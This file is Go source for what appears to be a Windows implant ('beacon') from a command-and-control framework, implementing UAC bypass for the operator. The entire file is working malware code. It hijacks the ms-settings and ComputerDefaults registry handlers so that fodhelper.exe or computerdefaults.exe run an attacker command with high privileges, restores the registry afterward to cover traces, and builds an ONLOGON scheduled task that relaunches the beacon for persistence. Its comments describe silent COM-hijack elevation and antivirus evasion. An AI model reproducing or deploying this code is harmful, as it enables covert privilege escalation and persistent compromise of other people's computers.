//go:build windows

package beacon

import (
	"encoding/json"
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"

	"dark-arts/pkg/tasking"
)

var (
	shell32           = syscall.NewLazyDLL("shell32.dll")
	procShellExecuteW = shell32.NewProc("ShellExecuteW")
)

const (
	uacKeyMsSettings   = `Software\Classes\ms-settings`
	uacKeyComputerDefs = `Software\Classes\ComputerDefaults`
	uacCommandSubkey   = `Shell\Open\command`
	uacSpawnTimeout    = 20 * time.Second
	uacPollInterval    = 250 * time.Millisecond
)

// runUac runs a single elevated command without a UAC prompt. The default
// method (daily) is fully silent: it arms a per-user CLSID override for the
// UnifiedConsentSyncTask ComHandler and waits (up to 26h) for the task's
// daily fire, whose payload bootstraps a reusable HighestAvailable scheduled
// task and runs the pending command at HIGH. Once bootstrapped, every
// invocation is instant and silent via schtasks /run. The schtasks method
// installs the same reusable task through one visible UAC prompt on first
// use. The cmluautil, fodhelper and computerdefaults methods remain
// available but are dead on modern builds or heavily signatured by AV. The
// elevated child's stdout/stderr are captured to a temp file so the operator
// gets the output back in the task result.
func (e *Executor) runUac(payload []byte, res *tasking.Result) {
	var p struct {
		Method string `json:"method"`
		Name   string `json:"name"`
		Cmd    string `json:"cmd"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		res.Error = err.Error()
		return
	}
	cmd := p.Cmd
	if cmd == "" {
		if p.Name == "" {
			res.Error = "beacon: uac requires cmd or name"
			return
		}
		exe, err := os.Executable()
		if err != nil {
			res.Error = "beacon: uac cannot determine executable path: " + err.Error()
			return
		}
		// Default: silently create the ONLOGON task that relaunches this beacon.
		cmd = fmt.Sprintf(`cmd /c schtasks /Create /TN %s /TR "cmd /c start """" /b ""%s"""" /SC ONLOGON /RL LIMITED /F`, p.Name, exe)
	}
	var method string
	switch p.Method {
	case "", "daily":
		method = "daily"
	case "schtasks":
		method = "schtasks"
	case "cmluautil":
		method = "cmluautil"
	case "fodhelper":
		method = "fodhelper"
	case "computerdefaults":
		method = "computerdefaults"
	default:
		res.Error = "beacon: uac method must be daily, schtasks, cmluautil, fodhelper or computerdefaults"
		return
	}
	out, err := e.runElevated(method, cmd)
	if err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = []byte(out)
}

func (e *Executor) runElevated(method, cmd string) (string, error) {
	switch method {
	case "daily":
		// The daily channel manages its own output file and timeout.
		return e.runElevatedTaskDaily(cmd)
	case "schtasks":
		// The task path manages its own output file and timeout.
		return e.runElevatedTask(cmd)
	}

	tmp, err := os.CreateTemp("", "darts*.out")
	if err != nil {
		return "", fmt.Errorf("beacon: uac temp file: %w", err)
	}
	tmpPath := tmp.Name()
	tmp.Close()
	defer os.Remove(tmpPath)

	launch := cmd + ` > "` + tmpPath + `" 2>&1`
	switch method {
	case "cmluautil":
		if err := shellExecElevated(launch); err != nil {
			return "", err
		}
	case "fodhelper", "computerdefaults":
		if err := registrySpawnElevated(method, launch); err != nil {
			return "", err
		}
	default:
		return "", fmt.Errorf("beacon: uac method must be cmluautil, fodhelper or computerdefaults")
	}

	deadline := time.Now().Add(uacSpawnTimeout)
	for time.Now().Before(deadline) {
		if fi, err := os.Stat(tmpPath); err == nil && fi.Size() > 0 {
			data, err := os.ReadFile(tmpPath)
			if err != nil {
				return "", fmt.Errorf("beacon: uac read output: %w", err)
			}
			return string(data), nil
		}
		time.Sleep(uacPollInterval)
	}
	return "", fmt.Errorf("beacon: uac timed out waiting for elevated process (is the user an admin in approval mode?)")
}

// registrySpawnElevated hijacks an auto-elevating System32 binary
// (fodhelper.exe / computerdefaults.exe) through a HKCU\Software\Classes
// handler, then restores the registry to its prior state.
func registrySpawnElevated(method, launch string) error {
	var keyPath, launcher string
	switch method {
	case "fodhelper":
		keyPath, launcher = uacKeyMsSettings, "fodhelper.exe"
	case "computerdefaults":
		keyPath, launcher = uacKeyComputerDefs, "computerdefaults.exe"
	}
	fullKey := keyPath + `\` + uacCommandSubkey
	existed := false
	oldDefault := ""
	k, err := registry.OpenKey(registry.CURRENT_USER, fullKey, registry.QUERY_VALUE)
	if err == nil {
		existed = true
		oldDefault, _, _ = k.GetStringValue("")
		k.Close()
	}
	k, _, err = registry.CreateKey(registry.CURRENT_USER, fullKey, registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("beacon: uac registry: %w", err)
	}
	if err := k.SetStringValue("", launch); err != nil {
		k.Close()
		return fmt.Errorf("beacon: uac registry: %w", err)
	}
	if err := k.SetStringValue("DelegateExecute", ""); err != nil {
		k.Close()
		return fmt.Errorf("beacon: uac registry: %w", err)
	}
	k.Close()

	cleanup := func() {
		if !existed {
			_ = registry.DeleteKey(registry.CURRENT_USER, keyPath)
			return
		}
		kk, err := registry.OpenKey(registry.CURRENT_USER, fullKey, registry.SET_VALUE)
		if err == nil {
			if oldDefault == "" {
				_ = kk.DeleteValue("")
			} else {
				_ = kk.SetStringValue("", oldDefault)
			}
			_ = kk.DeleteValue("DelegateExecute")
			kk.Close()
		}
	}
	defer cleanup()

	// Launch the auto-elevating binary via ShellExecute so AppInfo silently
	// grants it a high token. CreateProcess would refuse it (error 740).
	h, _, _ := procShellExecuteW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("open"))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(launcher))),
		0, 0, 0,
	)
	if uintptr(h) <= 32 {
		return fmt.Errorf("beacon: uac launch %s failed (ShellExecute code %d)", launcher, uintptr(h))
	}
	return nil
}
